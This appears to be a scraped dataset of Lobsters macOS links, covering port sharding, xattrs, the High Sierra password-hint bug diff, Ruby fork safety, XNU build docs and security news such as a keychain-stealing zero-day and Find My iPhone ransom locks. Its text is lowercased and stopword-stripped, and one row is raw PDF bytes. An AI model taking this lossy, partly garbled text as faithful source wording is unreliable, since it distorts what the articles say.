370,Lobsters,mac,Apple macOS,"Port Sharding: Multiple Processes, Same Port",https://github.com/joewalnes/port-sharding,port sharding multiple process port,linux port sharding demo linux port sharding setup usage,linux port sharding demo demo showing use soreuseport linux socket option allowing multiple process listen tcp udp port example available ruby python thing see really quick linux port sharding walkthrough first setup linux kernel later check uname v run python ruby script directly mac osx fret install docker run make install working docker image drop ready go tmux session call script usage run server listens port connect netcat telnet see something nc localhost run another server process see kernel allows listen port connect port see kernel pick one process allows handle next time may another process add remove process even run python ruby process time kernel share workload however note queued connection accepted lost stopping process
371,Lobsters,mac,Apple macOS,"Extended attributes: the good, the not so good, the bad. (2014)",https://www.lesbonscomptes.com/pages/extattrs.html,extended attribute good good bad,freedesktop page,extended file attribute namevalue textual pair associated file describe beyond standard filesystem attribute provide linux bsd modern file system capability year mac o x apart minor interface difference feature work identically three system extended attribute valuable storing file metadata eg author john smith subject country landscape many case want store data file internal property however moment application use file extended attribute beagle used store data according freedesktop page seems rox apache currently use also dropbox see comment section likely explanation slow adoption still slightly reluctant support extended attribute found linux distribution general filesystem utility lot lag actual filesystem capability using extended attribute viable long good chance preserved common filesystem operation tool metadata precious want lose using wrong tool first wrote document glaring issue lack universally available crossplatform file archiver format would preserve extended attribute could find direct way create archive given type system wich would extractable two others standard tool eg create linux extract freebsd mac o x however thing changed since gnu bsd recent version tar support storing extended attribute use incompatible format easily available system major showstopper still minor inconvenient utility require nondefault argument store extract extended attribute another indication still somehow considered secondclass data lack nfs support big issue follows small inventory work us xattr abbreviation extended attribute notice error information could improve page please email jf dockesorg use comment section bottom
372,Lobsters,mac,Apple macOS,Screen Savers,https://stefan.arentz.ca/2017/10/20/screen-savers/,screen saver,screen saver sad mac puzzle mozilla,screen saver oct recently wrote three small screen saver macos ton fun something therapeutic making available open source let know think sad mac one ode classic mac sad mac would show internal hardware test failed like bad ram chip codewise basic screen saver actually drop sprite floor let pile thing took time get physic parameter right make feel natural puzzle sliding puzzle dark probably favorite back day worked well smooth think specially loved one messed actual screen reimplementation simply chop screenshot turn piece spritekit node easily moved around spritekit pretty amazing found simple turn idea working prototype mozilla one show new mozilla logo drop two size firefox focusnightly icon lot bouncing spin logo around many pile since logo simple rectangular bounding box create outline collission detection used nice little web based tool let draw path top image generated objectivec code work open source see project feel free leave bug report open feature request
373,Lobsters,mac,Apple macOS,The new MacBook keyboard is ruining my life,https://theoutline.com/post/2402/the-new-macbook-keyboard-is-ruining-my-life,new macbook keyboard ruining life,ibm model insect leg criticized virtually nonexistent key travel put page macbook saga pocket cast overcast stitcher tunein alexa anchor db radiopublic r casey johnston,grand central station apple store third time year watching progress bar slowly creep across computer black screen genius multitasked helping another customer ipad computer getting third diagnostic test minute problem logic board failing battery dying camera nt respond mysteriously faulty innerworkings spacebar broken even physically broken still moved acted normally every time pressed spaced twice maybe piece dust genius offered previous time apple store computer problem misbehaving keyboard genius said exact nonchalant word stunned silence first time seemed improbable blame core problem small thing second time could nt believe first time heard line fluke time third time ready hold said single piece dust lay whole computer nt think kind problem every computer owned bought latest macbook pro last fall fixing would begun removing key peering around well see simply dirty keyboard fact apple keyboard composed single irreparable piece technology fixing replacing half computerthe genius shrugged empathetically cast around pointed nearby macbook pro relatively thicker key one said apologetically though apple employee receive significant yearly discount computer first significant redesign macbook pro body eight year chosen buy one new one even year later single piece dust lay whole computer nt think kind problem apple one technology company tried improve speak upon notebook laptop keyboard consumer computer keyboard like ibm model chunky mechanical thick plastic key buckling spring mechanism laptop company started use scissor switch crossed piece plastic hold switch took le space mechanism like rubber dome pop key tiny plastic nipple sticking rubber dome scissor switch closed design supposed help prevent dirt debris getting key extension rest computer also take le space nice computer meant carried around tradeoff enhanced hygiene slimmer profile scissorswitch key difficult separate base rubberdomed one impossiblebutterfly switch used apple laptop keyboard scissor switch taken extreme still prop key two intersecting piece plastic profile low key barely travel difference key nothing key pressed maybe millimeter two opposed millimeter scissor switch one better part inch mechanical one true name butterfly switch also extremely delicate held place four tiny thread brittle plastic insect leg size durabilitythe primary motivator behind rise butterfly switch seems apple keep trying make product thinner degree beyond reason point macbook pro weigh little three pound also stand reason apple logic went something like scissor switch lower profile le dirt key therefore butterfly switch even lower profile even le dirt key better keyboard everyone theoretically except people like feeling key moving finger also called typingunfortunately apple turned many people first generation butterfly keyboard arrived macbooks released criticized virtually nonexistent key travel typing felt like slapping finger vinyl counter wired something wonderful hitting key something happen feeling get lost macbook pro released said secondgeneration butterfly switch raised ever slightly first generation giving approximately one micrometer travelperhaps true le dirt get butterfly switchedkeys therein lie problem dirt get get piece dust capable rendering butterfly switch nonfunctional key wo nt click register whatever command supposed typing effectively dead someone either shake loose debris trapped blow upsidedown keyboard nintendocartridge style meanwhile apple quietly put page instruction expressly try help people dead butterfly switch keysthe problem dead key unless stop midpaper report email game physical tiff computer temptation slam little harder delicate key get n b period need reach stopping place high logical athome remedy consumer one key butterfly switchedkeyboard becomes nonfunctional unless dislodge whatever dust crumb messing without able physically access keyboard effectively broken remove key try clean stand high chance breaking permanently leave continue pound key type one measly letter also might break permanently single piece dust literally fuck overi would say issue computerit unclear big problem butterfly switch keyboard apple forum overflowing report genius told customer apple collecting data issue one corporate issuer macbook pro question reported business encountered significant number keyboard issue le sure another genius explained seen overwhelming number computer keyboard issue spacebar particular key delicately removed spacebar break every single time anyone including professional try remove big problem since according genius spoke key susceptible acting aforementioned piece dust would say issue computer told apple declined comment computer actually broken dead malfunctioning key brought apple store genius run fewer three diagnostic test take minute one involves genius pressing every single key keyboard see switch responsive test told added response sheer number keyboard coming back broken process take hourif apple decides replace keyboard sends computer replace entire top case thing replacing individual key keyboard macbook pro top case retail computer around long enough anyone warranty yet regular macbooks first available spring apple quoted much replace top case warranty path piece dust repair terrifyingly shortapple moving direction computer repaired without major surgery time little year ago one little rubber foot fell previous computer went apple store expecting genius stick replacement foot took two appointment hour series incredulous genius learn alongside apple solution problem replace entire bottom casethe path piece dust repair terrifyingly short maybe butterfly switch simply stroke applestorerepairbusinessgeneration genius hard believe apple business largest cash pile america either need shrewd belief customer still thrall image would overlook fact one basic functionality laptop continually hang single delicate little butterfly anklemy computer came back repair memphis new top case including new keyboard slightly different marking control option key key work write shaft sunlight falling across right side keyboard window behind catching halfdozen piece dustthe macbook sagaapple slapped lawsuitapple admits computer brokenapple fix anythingto listen episode outline world dispatch subscribe link belowpocket cast overcast stitcher tunein alexa anchor db radiopublic r ok google play news outline casey johnston editor wirecutter
374,Lobsters,mac,Apple macOS,Reverse Engineering macOS High Sierra Supplemental Update,https://cocoaengineering.com/2017/10/08/reverse-engineering-macos-high-sierra-supplemental-update/,reverse engineering macos high sierra supplemental update,macos high sierra supplemental update binary diffing ida diaphora xpc mechanism blog post bug reproduce using command line could prevented unit testing code review conclusion like,reported matheus mariano brazilian software developer programming error discovered apple recent operating system high sierra exposed password encrypted volume password hint serious bug quickly made headline technology website everywhere dreaded password hint bug dontdisplaythis actual password apple prompt provide macos high sierra supplemental update customer via app store ensured every distribution high sierra server included update decided apply binary diffing technique update learn root cause bug hypothesize defect could prevented inspecting package see change disk utility keychain access apps also related framework command line tool post focus password hint bug first step extract applicationsutilitiesdisk utilityappcontentsmacosdisk utility compare binary stock macos high sierra written emacs extension launch ida whenever load macho file buffer generates sql database information decompiled function load patched binary finally output diff generated diaphora technique useful deconstructing binary updated minor patch release usually change common heuristic work well diff version disk utility binary revealed difference decompilation usually mean substantial change reside one linked framework interesting one investigation storagekit private apple framework expose apfs functionality disk utility two part client library daemon storagekitd client connects daemon using apple standard xpc mechanism daemon executes operation represented subclass nsoperation client demand interesting usage storagekit inside disk utility reference storagekit structure controller code disk utility part code run add new apfs volume disk utility interface concretely controller responsible managing new volume sheet diffing storagekit provided much interesting result skhelperclient addchildvolumetoapfscontainer name casesensitive minsize maxsize password passwordhint progressblock completionblock one function modified supplemental update inspecting difference decompilation revealed actual bug picture old vulnerable storagekit diff updated one removed line removed depicted red added line green change yellow function basically creates instance nsmutabledictionary cocoa representation hash table fill information volume dictionary passed addchildvolumetoapfscontainer optionsdictionary handlingprogressforoperationuuid completionblock optionsdictionary argument interesting key dictionary kskapfsdiskpasswordoption kskapfsdiskpasswordhintoption responsible storing password password hint respectively bug variable contains password represented decompilation virtual register used value key dictionary meaning clear password incorrectly sent password hint via xpc reconstructed objectivec code bug would something like nsmutabledictionary optionsdictionary nsmutabledictionary alloc init optionsdictionary kskapfsdiskpasswordoption password optionsdictionary kskapfsdiskpasswordhintoption password corrected function supplemental update note correct variable password password hint set example common category bug code common structure copied pasted developer forgets make every required modification consequently fatal change behavior curious blog post show example last line effect bug open source software important emphasize although particular dictionary stored anywhere simply used pack information sent storagekitd fact password sent incorrectly password hint meant storagekitd trusted client stored clear text thinking password hint bug reproduce using command line common question apparently disk utility command line diskutil use different code path storagekit appear direct dependency diskutil transitive closure dependency otool l output usrliblibcsfdedylib compatibility version current version usrliblibcsfdedylib compatibility version current version usrliblibcorestoragedylib compatibility version current version systemlibraryframeworksfoundationframeworkversionscfoundation compatibility version current version systemlibraryframeworksiokitframeworkversionsaiokit compatibility version current version systemlibraryprivateframeworksdiskmanagementframeworkversionsadiskmanagement compatibility version current version systemlibraryframeworksdiscrecordingframeworkversionsadiscrecording compatibility version current version compatibility version current version systemlibraryframeworksdiskarbitrationframeworkversionsadiskarbitration compatibility version current version usrliblibicucoreadylib compatibility version current version usrliblibobjcadylib compatibility version current version usrliblibsystembdylib compatibility version current version systemlibraryframeworkscorefoundationframeworkversionsacorefoundation compatibility version current version duplication le functionality sometimes justified certainly increase opportunity bug could prevented two engineering practice help bug like eradicate completely unit testing unit testing practice creating software test exercise single unit computer program unit typically class module effective unit testing requires sensing output reliably asserting expected side effect function complicate unit testing bit particular bug side effect communication xpc service separating logic creates dictionary part communicates service would help software design easily testable company rely excessively manual testing effective way testing given high number combination typical modern software qa engineer test setting password password hint easily forgettable tight deadline code review code review practice reviewing code land main development branch software project code review always small reviewer attention focused suggest better improvement even spot bug like last line bug easily ignored part huge code review conclusion unfortunate bug macos high sierra stained bit generally wellreceived debut rootcase analysis learn happened exactly good software development practice including testable design strict code review help reduce chance kind problem happen future like like loading
375,Lobsters,mac,Apple macOS,Why Ruby app servers break on macOS High Sierra and what can be done about it,https://blog.phusion.nl/2017/10/13/why-ruby-app-servers-break-on-macos-high-sierra-and-what-can-be-done-about-it/,ruby app server break macos high sierra done,passenger forking smart spawning forking smart spawning forking dangerous bitten apple good intention asyncsignalsafe code defined rule allowed allowed forking problem always even high sierra even linux app server trigger error jessica stokes cite example response app server author puma issue tracker reddit rruby jessica stokes misty de meo boaz segev opened issue report puma iodine decision far unicorn chosen take action chosen take action issue passenger workaround included make app server work activating workaround manually towards real solution cooperation gem author required conclusion passenger twice fast hiring developer advocate,people upgraded macos high sierra using preforking app server puma unicorn right setting may noticed error objc nsplaceholderdictionary initialize may progress another thread fork called safely call ignore fork child process crashing instead set breakpoint objcinitializeafterforkerror debug cryptic error triggered following condition using unicorn preloadapp puma cluster mode iodine prefork mode passenger smart spawning mode using mri application us gem either directly indirectly linked macos foundation framework error caused change fork behaves high sierra article cover apple change puma unicorn passenger author responding need anything wider ruby ecosystem forking puma unicorn passenger implement feature known preforking puma called cluster mode unicorn called preloadapp passenger called smart spawning feature work like app server load application code gem code inside process memory app server tell o make multiple exact virtual copy called forking copy called child process copy original used process request forking faster us le memory simply starting multiple instance app server first forking process nearly instant compare starting another app server instance take multiple second second modern operating system implement something called virtual memory nt really copy original process memory immediately instead make copyonwrite copy copy virtual actual memory copied moment original process child process try modify memory modified memory region copied entire memory space preforking implementation passenger smart spawning process well preloader share application code web framework code lot software use signature unix technique apache nginx example use forking extensively unix linux good multithreading support unix software tended implement concurrency forking instead spawning thread forking dangerous forking one danger fundamentally odds multithreading following property fork process thread called fork remain thread disappear moment process fork thread may arbitrary inconsistent state second property especially dangerous general assume anything application state forking multithreaded application almost everything dangerous code directly indirectly read modifies memory crash freeze consider following typical example reproduced multiple time development passenger application spawn thread x thread allocating memory buffer memory allocator lock global mutex thread x allocating memory buffer also lock global mutex application main thread fork child process also allocates memory memory allocation mutex locked x gone never unlocked child process deadlock forever child simply unlock mutex either fact mutex still locked mean heap inconsistent state bitten apple good intention ironically objectivec error mentioned beginning article caused fact apple tried add support forking objectivec library safely forked multithreaded application execute asyncsignalsafe code like threadsafe code stronger guarantee ca nt rely mutexes define critical section biggest critical section count one cpu instruction apple objectivec library historically supported kind asyncsignalsafety try call objectivec library forking would work time fails probably fails catastrophically high sierra apple defined rule allowed allowed forking also added asyncsignalsafety limited number apis also started enforcing rule happens call disallowed function forking high sierra appearing work time occasionally failing catastrophically time lucky thread important stuff application appear work fine may still corrupted state somewhere nt notice least immediately unlucky application crash freeze mysterious way theory even accidentally wipe hard drive since high sierra apple make application crash immediately takeaway problem always even high sierra even linux high sierra chosen fail fast instead silently allowing corruption app server trigger error ruby puma unicorn passenger nt direct dependency apple objectivec library one gem use may dependency either directly indirectly jessica stokes cite example pg gem application loading pg native extension linked postgres turn linked kerberosframework ldapframework example trace user start app server preforking mode ruby load gem bundle app server fork app call gem function maybe multiple layer call nsplaceholderdictionaryinitialize one rule apple defined may call foundation class initializers forking function crash process immediately response app server author issue spawned long discussion puma issue tracker reddit rruby jessica stokes misty de meo boaz segev done lot initial work involved figuring root cause problem well finding workarounds cover later article clear app server root cause issue app server really solve issue major part discussion revolved around workaround belongs app server invoke workaround one implementing preforking workaround included ruby provide consistent environment across operating system user activate workaround manually october general consensus thread workaround included ruby participant also identified reason ruby core team may want include workaround would nt hurt try convince october jessica opened issue report ruby bug tracker effort convince ruby core team include workaround also actively participating issue report think workaround belongs ruby puma iodine decision far puma iodine author made decision far workarounds unicorn chosen take action unicorn author eric wong chosen take action issue ground access macos passenger workaround included passenger philosophy put user experience forefront believe writing managing apps easy hasslefree productive software serve user therefore chosen include workaround next passenger version everything work tm much possible make app server work activating workaround manually using passenger manually activate workaround suppress error message set following environment variable starting puma unicorn iodine export objcdisableinitializeforksafetyyes using passenger upgrade activate workaround automatically activating workaround effectively return macos prehigh sierra behavior note skipped announce near future towards real solution cooperation gem author required workaround really solve problem fundamental problem forking odds multithreading still even high sierra even linux workaround merely disables safety check user lucky nt run bad situation time guarantee forking safe application must running thread point fork thread must executing asyncsignalsafe code mri guarantee code degree third party native library may spawn thread gem user pull must spawn thread app server forked propose following author gem native extension gem ensure thread spawned require time instead ensure thread spawned calling explicit initialization method way user configure app server way thread initialized forking preserving advantage copyonwrite preforking conclusion ruby app server use preforking technique improve speed efficiency technique without danger particular fundamentally odds multithreading matter operating system used macosspecific problem high sierra introduced sanity check prevent pitfall related forking may run error using ruby app server high sierra using puma unicorn iodine activate workaround manually using passenger simply upgrade everything taken care automatically truly solve problem cooperation wider ruby ecosystem required status quo seems good enough situation even though luck draw please consider reading reference deepen understanding issue also consider checking passenger set u apart hardcore dedication towards performance scalability also focusing user experience developer efficiency happiness passenger constantly improved latest major version twice fast thanks brandnew zerocopy http engine feature keeping production stable take care hard stuff nt finally hiring example developer advocate position happy developing
376,Lobsters,mac,Apple macOS,"Privilege escalation with kill(-1, SIGKILL) in XNU kernel of macOS High Sierra",https://groups.google.com/d/msg/nix-devel/KV9eomIdxWE/W8WMYrSlAQAJ,privilege escalation kill sigkill xnu kernel macos high sierra,,use google group discussion please enable javascript browser setting refresh page
377,Lobsters,mac,Apple macOS,rat: Compose shell commands to build interactive terminal applications,https://github.com/ericfreese/rat,rat compose shell command build interactive terminal application,rat overview tig getting started warning super experimental probably going change lot install configure keybindings mode definition annotator definition keybinding definition source configuration separate file example usage run development dependency license mit license license,rat compose shell command build terminal application overview rat developed part effort build tiglike application little opinionated ui logic delegating instead capability shell command like git log pretty graph option shell command executed output captured displayed pager configurable annotator parse output adding annotation acted upon run shell command getting started warning super experimental probably going change lot install go get githubcomericfreeserat go build go install configure rat configured file ratrc home config directory xdgconfighomerat configrat default rat pager opened one mode mode configuration annotator key binding annotator look content pager special bit text action taken bit text called annotation annotation start end class value key binding define action taken annotation keybindings first need set keybindings add following ratrc modify desired bindkey cr reload bindkey j cursordown bindkey k cursorup bindkey ce scrolldown bindkey cy scrollup bindkey cd pagedown bindkey cu pageup bindkey g g cursorfirstline bindkey sg cursorlastline bindkey sj parentcursordown bindkey sk parentcursorup bindkey q poppager bindkey sq quit bindkey showone bindkey showtwo bindkey showthree ctrlc always quit mode definition mode keyword start mode definition annotator definition inside mode definition annotate keyword start annotation definition mode name annotate type class option end type annotator type match regex external class class apply annotation annotator find option type match shell command output newlinedelimited string annotator search type regex define regular expression search golang regular expression supported type external name executable located configratannotators executed sent content pager via stdin executable print annotation stdout specific binary format start byte offset beginning stdin littleendian unsigned integer end byte offset beginning stdin littleendian unsigned integer value length length found value string byte littleendian unsigned integer value string string abovespecified length encoded keybinding definition bindkey keyword start keybinding definition mode name bindkey key annotationclasses newpagermode action end bindkey key action bindkey key newpagermode cmd key key combination trigger action pressed modifier added c see libkeyeventgo list supported named key action named action run key pressed see actiongo list available action annotationclasses action triggered annotation class present current line omitted keybinding work anywhere pager commadelimited newpagermode action create new pager defines mode use creating pager cmd shell command run specified key combination pressed annotation value exported command process variable named annotation class default open new pager showing output shell command several special prefix used specify different action taken open new pager execute command reload current pager like confirm user first press yes n like default open new pager content shell command also set parentchild relationship parent cursor moved inside child pager parentcursorup parentcursordown command note keybindings inside mode definition always available special prefix behavior described source configuration separate file source keyword import configuration rule another file file path relative rat config directory file contains valid rat configuration instruction example add following ratrc build simple file viewermanager mode file find file directory current directory annotate class file annotate match file l grep v cursor line annotation class file enter key pressed run cat value annotation filename display output new pager mode preview bindkey enter file preview cat file cursor line annotation class file e key pressed open selected file vim bindkey e file vim file cursor line annotation class file shift x pressed delete file user confirms bindkey sx file rm file end run rat mode file cmd l al try see output l al move cursor line regular file press enter view content try keybindings try tweaking thing see example directory configuration example usage run rat mode mode cmd command mode default default cmd provided rat read stdin development dependency dependency managed using glide license project licensed mit license full text license see license file
378,Lobsters,mac,Apple macOS,The Apple of Your EFI,https://duo.com/assets/ebooks/Duo-Labs-The-Apple-of-Your-EFI.pdf,apple efi,,obj endobj xref n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n trailer prev startxref eof obj stream l r q yx mʥm e u ԥ c endstream endobj obj lang enus metadata rnames ropenaction routlines rpagelayoutonecolumnpages rtypecatalogviewerpreferences endobj obj endobj obj endobj obj extgstate font procset pdftext xobject rotate rtrimbox typepage endobj obj endobj obj endobj obj iccbased r endobj obj stream n wukm v z ӟy l endstream endobj obj stream
379,Lobsters,mac,Apple macOS,Apple Open Sources XNU Kernel,https://github.com/apple/darwin-xnu,apple open source xnu kernel,xnu xnu source tree build xnu building kernel building fat kernel binary makefile option debug information format building kernelcaches running kernelcache target machine creating tag cscope coding style reindenting file webkit website clang doc install new header file xnu iokitiokitmakefile conditional compilation add new syscall testing kernel osfmktestsreadmemd toolstestsunittestsreadmemd kernel data descriptor libkddreadmemd debugging kernel readmemd,xnu xnu kernel part darwin operating system use macos io operating system xnu acronym x unix xnu hybrid kernel combining mach kernel developed carnegie mellon university component freebsd c api writing driver called iokit xnu run single processor multiprocessor configuration xnu source tree config configuration exported apis supported architecture platform setup basic set tool used configuring kernel versioning kextsymbol management externalheaders header sourced project avoid dependency cycle building header regularly synced source updated libkern c iokit library code handling driver kexts libsa kernel bootstrap code startup libsyscall syscall library interface userspace program libkdd source user library parsing kernel data like kernel chunked data makedefs top level rule defines kernel build osfmk mach kernel based subsystem pexpert platform specific code like interrupt handling atomics etc security mandatory access check policy interface related implementation bsd bsd subsystem code tool set utility testing debugging profiling kernel build xnu building development kernel xnu make system build kernel based kernelconfigs archconfigs variable argument syntax make sdkroot sdkroot archconfigs arch kernelconfigs variant sdkroot path macos sdk disk default variant debug development release profile configures compilation flag asserts throughout kernel code arch valid arch build eg build kernel architecture running o type make make sdkrootmacosxinternal additionally support configuring architecture archconfigs kernel configuration kernelconfigs make sdkrootmacosxinternal kernelconfigsdevelopment make sdkrootmacosxinternal kernelconfigs release development debug note default architecture set build machine architecture default kernel config set build development also create bootable image kernel config kernel binary symbol kernel config unstripped building fat kernel binary define architecture environment running make command make archconfigs exporthdrs makefile option make use process build default number active cpu make standard commandline option also accepted make w trace recursive make invocation useful combination verboseyes make build without llvm link time optimization make remotebuilduser remotehost perform build remote host make build clang json compilation database xnu build system optionally output colorformatted build output enable either set xnulogcolors environment variable pas logcolorsy make command debug information format default dwarf debug information repository created install phase bundle named kerneldevelopment variant dsym select older stab debug information format debug information embedded kerneldevelopmentunstripped image set buildstabs environment variable export make building kernelcaches test xnu kernel need build kernelcache link kexts kernel together single bootable image build kernelcache use following mechanism using automatic kernelcache generation kextd kextd daemon keep watching changing systemlibraryextensions directory setup new kernel cp systemlibrarykernels touch systemlibraryextensions p e grep kextd manually invoking kextcache build new kernelcache kextcache q z l n c vartmpkernelcachetest k vartmpkerneltest systemlibraryextensions running kernelcache target machine development kernel iboot support configuring boot argument safely boot test kernel thing go wrong safely fall back previously used kernelcache following step get setup create kernel cache using kextcache command kernelcachetest copy exiting boot configuration alternate file cp librarypreferencessystemconfigurationcomapplebootplist nextbootplist update kernelcache bootargs setup plutil insert kernel cache string kernelcachetest nextbootplist plutil replace kernel flag string v kernelsuffixtest nextbootplist copy new config librarypreferencessystemconfiguration cp nextbootplist librarypreferencessystemconfigurationbootplist bless volume new configs sudo n bless mount setboot nextonly option configboot nextonly flag specifies use bootplist configs one boot kernel panic easily power reboot recover back original kernel creating tag cscope set build environment top directory run make tag build ctags etags casesensitive volume ctags caseinsensitive make tag build etags make cscope build cscope database coding style reindenting file source file reindented using clangformat setup clangformat xnu follows variant webkit style source code formatting please refer format style webkit website option style option available clang doc note clangformat binary may part base installation compiled llvm clang source reachable path top directory run make reindent reindent source file using clang format install new header file xnu install iokit header see additional comment iokitiokitmakefile xnu installs header file following location dstroot systemlibraryframeworkskernelframeworkheaders b dstroot systemlibraryframeworkskernelframeworkprivateheaders c dstroot usrinclude dstroot systemlibraryframeworkssystemframeworkprivateheaders kernelframework used kernel extension systemframework usrinclude used user level application header file framework privateheaders available apple internal development directory containing header file makefile creates list file installed different location adding first header file directory need create makefile similar xnubsdsysmakefile add header file correct file list depending want install default location header file installed file list datafiles make header file available user level dstroot usrinclude b privatedatafiles make header file available apple internal user level dstroot systemlibraryframeworkssystemframeworkprivateheaders c kernelfiles make header file available kernel level dstroot systemlibraryframeworkskernelframeworkheaders dstroot systemlibraryframeworkskernelframeworkprivateheaders privatekernelfiles make header file available apple internal kernel extension dstroot systemlibraryframeworkskernelframeworkprivateheaders makefile combine file list mentioned different install list used build system install header file two type install list machinedependent machineindependent list indicated presence md mi build setting respectively header architecturespecific use machinedependent install list eg installmdlist header installed architecture use machineindependent install list eg installmilist install list interested exist create adding appropriate file list default install list member file list default location described installmilist installs header file location available everyone user level location dstroot usrinclude definition installmilist datafiles b installmilcllist installs header file location available apple internal user level location dstroot systemlibraryframeworkssystemframeworkprivateheaders definition installmilcllist privatedatafiles c installkfmilist installs header file location available everyone kernel extension location dstroot systemlibraryframeworkskernelframeworkheaders definition installkfmilist kernelfiles installkfmilcllist installs header file location available apple internal kernel extension location dstroot systemlibraryframeworkskernelframeworkprivateheaders definition installkfmilcllist kernelfiles privatekernelfiles e exportmilist export header file xnu bsd osfmk etc compilation install anything sdk definition exportmilist kernelfiles privatekernelfiles want install header file subdirectory path described specify directory name using two variable installmidir exportmidir follows installmidir dirname exportmidir dirname single header file exist different location using step mentioned however might desirable make code header file available location example want export function kernel level user level use c language preprocessor directive ifdef endif ifndef control text generated header file installed kernel includes code conditional macro true strip code false condition header file predefined macro description private defined enclosed definition considered system private interface visible within xnu exposed userkernel header installed within appleinternal privateheaders section system kernel framework b kernelprivate defined enclosed code available xnu kernel apple internal kernel extension omitted user header c bsdkernelprivate defined enclosed code visible exclusively within xnubsd module machkernelprivate defined enclosed code visible exclusively within xnuosfmk module e xnukernelprivate defined enclosed code visible exclusively within xnu f kernel defined enclosed code available within xnu kernel extension visible user level header file header file installed following path code dstroot systemlibraryframeworkskernelframeworkheaders dstroot systemlibraryframeworkskernelframeworkprivateheaders conditional compilation xnu offer following mechanism conditionally compiling code cpu characteristic code guarding specific characterstics vary based cpu architecture targeted use option prefer checking feature architecture eg littleendian etc b new feature code guarding taken together implement feature define new feature configmaster use resulting config preprocessor token eg feature named configvirtualmemory check configvirtualmemory practice ensures existing feature may brought platform simply changing feature switch c existing feature use existing feature code strongly tied eg use securekernel code implement new functionality exclusively relevant trusted kernel update definitionunderstanding trusted kernel mean recommended avoid compiling based target platform xnu define platform macro targetconditionalsh targetososx targetosios etc targetosembedded macro avoided general broad definition functionality add new syscall testing kernel xnu kernel multiple mechanism testing assertion development debug kernel configs compiled assertion enabled allows developer easily test invariant condition xnu power self test xnupost xnupost config allows building kernel basic set test function run first user space process launched since xnu hybrid mach bsd two location test added xnuosfmktests testing mach based kernel structure apis bsdtests testing bsd interface please follow documentation osfmktestsreadmemd user level test toolstests directory hold test verify syscalls feature xnu kernel make target xnutests used build test supported make rcprojectnamexnutests sdkrootpathtosdk test individual program run terminal report test status mean std posix exit code success andor stdout please read detailed documentation toolstestsunittestsreadmemd kernel data descriptor xnu us different data format passing data api standard way using syscall argument complex data often relies sending memory saved c structs packaged data transport mechanism fragile lead broken interface user space program kernel apis libkdd directory hold user space library parse custom data provided version kernel kernel chunked data format described detail libkddreadmemd debugging kernel xnu kernel support debugging remote kernel debugging protocol kdp please refer documentation technical note default kernel setup reboot panic debug live kernel kdp server setup listen udp connection ethernet machine without ethernet port behavior altered use kernel bootargs following common option setup debug variable start kdp debugserver panic v print kernel log screen default xnu show grey screen boot art override default port selection kdp supported ethernet thunderbolt serial debugging debug paniced kernel use llvm debugger lldb along unstripped symbol rich kernel binary sh lldb kerneldevelopmentunstripped connect paniced machine kdpremote ip addr gdbremote hostip port command kernel packaged kernel specific debug script part build process security reason special command script get loaded automatically lldb connected machine please add following setting lldbinit wish always load macro setting set targetloadscriptfromsymbolfile true toolslldbmacros directory contains source command please follow readmemd detailed explanation command usage
380,Lobsters,mac,Apple macOS,Ex-NSA hacker drops macOS High Sierra zero-day hours before launch,http://www.zdnet.com/article/apple-macos-high-sierra-password-vulnerable-to-password-stealing-hack/,exnsa hacker drop macos high sierra zeroday hour launch,macos high sierra first take solid foundation light eye candy short video bug bounty iphones ipads second zeroday sistersite cnet got tip read,image cnetcbs interactive hour apple expected roll new version desktop notebook operating system macos high sierra security researcher dropped zeroday patrick wardle former nsa hacker serf chief security researcher posted video hack password exfiltration exploit actionmacos high sierra first take solid foundation light eye candypasswords stored mac keychain typically requires master login password access vault wardle shown vulnerability allows attacker grab steal every password plaintext using unsigned app downloaded internet without needing passwordwardle tested exploit high sierra said older version macos o x also vulnerable tweeted short video demonstrating hack wardle created keychainstealer app demonstrating local exploit vulnerability according video expose password website service credit card number user logged exploit could included legitimatelooking app sent email attacker designing macos implant would dump keychain plugin said wardlehe reported bug apple earlier month unfortunately patch nt make high sierra said released monday passionate mac user continually disappointed security macos said nt mean taken personally anybody apple every time look macos wrong way something fall felt user aware risk sure sophisticated attacker similar capability apple marketing done great job convincing people macos secure think rather irresponsible lead issue mac user overconfident thus vulnerable added tweet wardle suggested apple launch macos bug bounty program charity right apple bug bounty iphones ipads pay highend secure boot firmware exploit second zeroday wardle found operating system month first show new software secure kernel extension loading feature vulnerable bypass apple provided sistersite cnet statement publication macos designed secure default gatekeeper warns user installing unsigned apps like one shown proof concept prevents launching app without explicit approval encourage user download software trusted source like mac app store pay careful attention security dialog macos present apple say patch bug got tip send tip securely signal whatsapp also send pgp email fingerprint daae read
381,Lobsters,mac,Apple macOS,High Sierra automatically checks EFI firmware each week,https://eclecticlight.co/2017/09/24/high-sierra-automatically-checks-efi-firmware-each-week/,high sierra automatically check efi firmware week,like,upgrading high sierra brings new significant security feature mac automatically check efi firmware series tweet xeno kovah one three engineer responsible new tool outlined work new utility eficheck located usrlibexecfirmwarecheckerseficheck run automatically week check mac firmware apple database known good pass see nothing discrepancy invited send report apple following dialog running real mac rather hackintosh kovah asks agree send report allow eficheck send binary data efi firmware preserving privacy excluding data stored nvram apple able analyse data determine whether altered malware anything else great majority user course never see dialog decision remembered agreed send data apple week time eficheck run automatically adhere original choice eficheck depends small local library known good data automatically silently updated security update turned app store pane developed xeno kovah nikolaj schlej corey kallenberg believed first attempt largescale privacypreserving checking firmware integrity type hopefully bring significant improvement security mac upgraded high sierra screenshot taken xeno kovah tweet information thanks xeno work knowledge like like loading related
382,Lobsters,mac,Apple macOS,Hackers Using iCloud's Find My iPhone Feature to Remotely Lock Macs and Demand Ransom,https://www.macrumors.com/2017/09/20/hackers-find-my-iphone-remote-mac-lock/,hacker using icloud find iphone feature remotely lock mac demand ransom,change apple id password,last day two several mac user appear locked machine hacker signed icloud account initiated remote lock using find iphone access icloud user username password find iphone icloudcom used lock mac passcode even twofactor authentication turned going apple allows user access find iphone without requiring twofactor authentication case person trusted device gone missing authentication required access find iphone user list devicesaffected user icloud account hacked receiving message demanding money passcode unlock locked mac device usernames password icloud account affected hack likely found various site data breach acquired breach apple server impacted user likely used email address account name password multiple account allowing people malicious intent figure icloud detail easy lock mac passcode find iphone someone apple id passwordto prevent issue like apple user change apple id password enable twofactor authentication never use password twice product like lastpass even apple icloud keychain ideal way generate store new password every website user mac locked need get contact apple support assistance removing find iphone lock thanks eli
